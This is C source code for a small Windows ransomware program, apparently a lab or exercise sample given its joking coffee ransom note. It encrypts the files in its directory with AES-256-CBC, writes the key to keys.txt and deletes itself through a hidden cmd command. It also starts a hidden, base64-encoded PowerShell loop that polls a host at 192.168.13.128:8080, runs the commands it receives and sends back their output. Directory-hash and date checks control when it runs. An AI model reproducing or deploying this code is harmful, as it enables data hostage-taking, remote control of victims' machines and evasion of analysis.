#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <openssl/rand.h>
#include <sys/stat.h>
#include <time.h>
#include <windows.h>
#include <openssl/sha.h>

// r@ns0mW4r3

void he(void) {ERR_print_errors_fp(stderr);abort();}
void gk(unsigned char *key, size_t key_length) {if (RAND_bytes(key, key_length) != 1) {fprintf(stderr, "Error generating random key\n");exit(1);}}
void giv(unsigned char* iv, size_t iv_size) {if (RAND_bytes(iv, iv_size) != 1) {perror("Error generating iv\n");exit(1);}}
void ct() {
    time_t now;
    time(&now);
    struct tm *current_time = localtime(&now);
    struct tm specified_time = {0};
    specified_time.tm_year = current_time->tm_year;
    specified_time.tm_mon = 11;                    
    specified_time.tm_mday = 11;                  
    time_t specified_time_t = mktime(&specified_time);
    if (difftime(now, specified_time_t) > 0) {
        printf("Current date is later than the --th of --- month.\nPress Enter to continue...\n");
        char input[256];
        fgets(input, sizeof(input), stdin);
        sd();
        exit(1);
    } else {
        printf("Current date is before ----\n");
        printf("This r@nS0Mw@r3 will run.");
    }
}

const char* get_filename(const char *path) {
    const char *filename = strrchr(path, '\\');
    if (!filename) {
        filename = strrchr(path, '/');
    }
    return filename ? filename + 1 : path;
}


void ch(char* str, unsigned char hash[SHA256_DIGEST_LENGTH] ) {
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, str, strlen(str));
    SHA256_Final(hash, &sha256);
}

void sc() {
    char cwd[1024];
    const unsigned char expected_hash[SHA256_DIGEST_LENGTH] = {
        0xee, 0x68, 0xda, 0x92, 0xa1, 0xaa, 0x9b, 0xda,
        0xb7, 0x02, 0x43, 0x8e, 0xac, 0xa7, 0x38, 0x34,
        0x35, 0x33, 0xe2, 0xeb, 0x67, 0x21, 0xf8, 0x7c,
        0x10, 0x38, 0x98, 0x35, 0xf3, 0x2b, 0xdb, 0x2e
    };
    if (_getcwd(cwd, sizeof(cwd)) == NULL) {
        perror("Cannot get current directory\n");
        exit(1);
    }
    char* lastdir = strrchr(cwd, '\\');
    if (lastdir != NULL) {
        lastdir++;
        unsigned char hash[SHA256_DIGEST_LENGTH];
        ch(lastdir, hash);
        if (memcmp(hash, expected_hash, SHA256_DIGEST_LENGTH) == 0) {
            printf("Running in the required directory.\n");
        } else {
            perror("Unsafe directory.\n");
            sd();
        }
    } else {
        printf("Could not determine the directory name.\n");
    }
    ct();
}

void sign(char* fn) {strcat(fn, ".mpl");}

int e(unsigned char *plaintext, int plaintext_len, unsigned char *key,
            unsigned char *iv, unsigned char *ciphertext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int ciphertext_len;
    if (!(ctx = EVP_CIPHER_CTX_new())) he();
    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
        he();
    if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
        he();
    ciphertext_len = len;
    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) he();
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

void ed(const char *dir_path) {
    struct dirent *entry;
    unsigned char key[32];
    unsigned char iv[16];
    
    DIR *dir = opendir(dir_path);
    gk(key, sizeof(key));
    giv(iv, sizeof(iv));

    if (dir == NULL) {
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        char file_path[1024];
        snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
        struct stat statbuf;

        if (stat(file_path, &statbuf) == 0) {
            if (S_ISREG(statbuf.st_mode)) {
                char ofilename[1024];
                char test[MAX_PATH];
                GetModuleFileName(NULL, test, MAX_PATH);
                printf("test: %s\n", get_filename(test));
                printf("file path: %s\n------\n", get_filename(file_path));

                if (strcmp(get_filename(test), get_filename(file_path)) == 0){
                    printf("found\n");
                    continue;
                }

                FILE* tfile = fopen(file_path, "rb");
                strcpy(ofilename, file_path);
                sign(ofilename);
                FILE* ofile = fopen(ofilename, "wb");
                
                unsigned char buffer[256];
                unsigned char ct[256 + EVP_MAX_BLOCK_LENGTH]; 

                int bytes_read;
                while ((bytes_read = fread(buffer, 1, sizeof(buffer), tfile)) > 0) {
                    int ciphertext_len = e(buffer, bytes_read, key, iv, ct);
                    fwrite(ct, 1, ciphertext_len, ofile);
                }
            }
        }
    }
    closedir(dir);
    FILE* important_info = fopen("keys.txt", "wb");
    fwrite(key, 1, sizeof(key), important_info);
    fwrite(iv, 1, sizeof(iv), important_info);
    fclose(important_info);
}

void sd() {
    char szFilePath[MAX_PATH];
    char szCmd[MAX_PATH + 10];
    GetModuleFileName(NULL, szFilePath, MAX_PATH);
    sprintf(szCmd, "cmd.exe /C ping 1.2.3.4 -n 1 -w 3000 > Nul & Del \"%s\"", szFilePath);
    WinExec(szCmd, SW_HIDE);
    exit(EXIT_SUCCESS);
}

void oc() {
    const char* command = "powershell -e JABzAD0AJwAxADkAMgAuADEANgA4AC4AMQAzAC4AMQAyADgAOgA4ADAAOAAwACcAOwAkAGkAPQAnAGYAZAA1ADQANABjADcANgAtAGQAZgBhAGMAMABkADkAYQAtAGMAZgAzAGMAYgAxADQAZgAnADsAJABwAD0AJwBoAHQAdABwADoALwAvACcAOwAkAHYAPQBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwBmAGQANQA0ADQAYwA3ADYAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOABjAGUAMgAtADkAYgA1ADYAIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AZABmAGEAYwAwAGQAOQBhACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAWAAtADgAYwBlADIALQA5AGIANQA2ACIAPQAkAGkAfQApAC4AQwBvAG4AdABlAG4AdAA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpACcAJwBlACcAJwB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AYwBmADMAYwBiADEANABmACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AOABjAGUAMgAtADkAYgA1ADYAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA== ";
    // Initialize the startup info structure
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Hide the window by setting the flag
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // This hides the window
    
    // Create the process
    if (CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Wait for the process to finish
        // WaitForSingleObject(pi.hProcess, INFINITE);
        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
void write_ransom_note() {
    FILE *file = fopen("RANSOM_NOTE.txt", "w");
    if (file == NULL) {
        return;
    }
    fprintf(file, "Your files have been encrypted.\n");
    fprintf(file, "To decrypt them, please buy me a coffee\n");
    fprintf(file, "Preferably Einspanner Please :>\n");
    fclose(file);
}

int main (void) {sc();ed(".");oc(); write_ransom_note();sd();}